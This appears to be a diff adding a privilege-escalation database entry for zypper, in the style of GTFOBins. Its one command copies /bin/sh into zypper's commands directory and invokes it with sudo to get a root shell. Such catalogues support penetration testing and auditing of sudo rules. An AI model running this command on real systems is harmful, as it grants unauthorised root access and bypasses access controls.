@@ -1,0 +1,4 @@
+name: zypper
+binary_path: /usr/bin/zypper
+exploit_cmds:
+- cp /bin/sh /usr/lib/zypper/commands/zypper-x && sudo /usr/bin/zypper x
